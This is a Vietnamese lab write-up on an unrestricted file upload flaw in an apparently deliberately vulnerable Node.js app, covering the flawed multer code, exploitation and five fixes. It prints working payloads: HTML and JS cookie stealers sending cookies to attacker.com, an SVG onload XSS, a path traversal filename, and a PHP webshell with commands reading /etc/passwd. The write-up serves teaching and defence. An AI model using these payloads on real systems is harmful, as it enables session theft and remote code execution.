# Unrestricted File Upload — Writeup

> **Mức độ:** Critical  
> **Vị trí:** `/upload`  
> **CWE:** CWE-434 — Unrestricted Upload of File with Dangerous Type

---

## 1. File Upload Vulnerability là gì?

Lỗ hổng file upload xảy ra khi ứng dụng cho phép user upload file mà không kiểm tra:
- **Loại file (MIME type):** image/jpeg vs application/x-php
- **Extension:** `.jpg` vs `.php`, `.html`, `.js`
- **Content:** File có thực sự là ảnh không?
- **Filename:** Có chứa path traversal như `../../etc/passwd` không?

---

## 2. Vị trí lỗi trong VulnWebApp

```javascript
// server.js
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, 'public/uploads');     // Lưu trong thư mục public
  },
  filename: (req, file, cb) => {
    cb(null, file.originalname);   // Giữ nguyên tên file gốc
  }
});

// Không có fileFilter — chấp nhận MỌI loại file
const upload = multer({ storage });
```

File được serve qua `/uploads/filename` — browser có thể render HTML, SVG, execute JS.

---

## 3. Cách khai thác

### 3.1 Upload HTML File — Stored XSS via File

**Tạo file `shell.html`:**
```html
<!DOCTYPE html>
<html>
<body>
<script>
  // Cookie stealer
  alert('XSS via uploaded file!');
  new Image().src = 'http://attacker.com/steal?c=' + document.cookie;
</script>
<h1>Nothing to see here...</h1>
</body>
</html>
```

**Bước thực hiện:**
1. Login → `/upload`
2. Upload `shell.html`
3. Truy cập `http://localhost:3000/uploads/shell.html`
4. JS thực thi trong context của domain localhost:3000
5. Cookie session bị đánh cắp

---

### 3.2 Upload SVG — XSS

**Tạo file `payload.svg`:**
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('SVG XSS: ' + document.cookie)">
  <rect width="100" height="100" fill="red"/>
</svg>
```

SVG là XML — browser xử lý event handlers như `onload`.

---

### 3.3 Upload JS File

**Tạo `evil.js`:**
```javascript
document.cookie = "session=stolen";
window.location = "http://attacker.com/steal?data=" + document.cookie;
```

Include vào trang qua XSS:
```html
<script src="http://localhost:3000/uploads/evil.js"></script>
```

---

### 3.4 Path Traversal trong Filename (nâng cao)

Nếu server không sanitize filename:
```
filename: ../../views/index.ejs
```
→ Ghi đè template file của server.

---

### 3.5 Nếu server là PHP (scenario)

```php
<?php system($_GET['cmd']); ?>
```
Upload `shell.php`, truy cập:
```
http://target.com/uploads/shell.php?cmd=id
http://target.com/uploads/shell.php?cmd=cat+/etc/passwd
```
→ Remote Code Execution (RCE).

---

## 4. Kết quả

| File Upload | Impact |
|-------------|--------|
| `.html` với XSS | Cookie theft, same-origin script execution |
| `.svg` với event | XSS bypass content filters |
| `.php` webshell | Remote Code Execution |
| Path traversal | Ghi đè server files |

---

## 5. Cách Fix 

### Fix 1: Whitelist extension

```javascript
const ALLOWED_EXTENSIONS = ['.jpg', '.jpeg', '.png', '.gif', '.webp'];

const fileFilter = (req, file, cb) => {
  const ext = path.extname(file.originalname).toLowerCase();
  if (ALLOWED_EXTENSIONS.includes(ext)) {
    cb(null, true);
  } else {
    cb(new Error(`Extension ${ext} not allowed`), false);
  }
};

const upload = multer({ storage, fileFilter });
```

### Fix 2: Validate MIME type

```javascript
const ALLOWED_MIMES = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];

const fileFilter = (req, file, cb) => {
  if (ALLOWED_MIMES.includes(file.mimetype)) {
    cb(null, true);
  } else {
    cb(new Error('Only image files allowed'), false);
  }
};
```

### Fix 3: Validate file content (magic bytes)

```javascript
const fileType = require('file-type');

app.post('/upload', upload.single('avatar'), async (req, res) => {
  const buffer = fs.readFileSync(req.file.path);
  const type = await fileType.fromBuffer(buffer);
  
  if (!type || !type.mime.startsWith('image/')) {
    fs.unlinkSync(req.file.path); // Xóa file nguy hiểm
    return res.status(400).json({ error: 'Not a valid image' });
  }
  // ...
});
```

### Fix 4: Rename file — không giữ tên gốc

```javascript
filename: (req, file, cb) => {
  const ext = path.extname(file.originalname).toLowerCase();
  const safeName = `${Date.now()}-${Math.random().toString(36).slice(2)}${ext}`;
  cb(null, safeName);
}
```

### Fix 5: Serve uploads từ subdomain riêng

```
uploads.yourdomain.com → không same-origin với app.yourdomain.com
→ XSS via upload không steal cookies của app chính
```

---

## 6. Tham khảo

- [OWASP — File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [PortSwigger — File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [CWE-434](https://cwe.mitre.org/data/definitions/434.html)
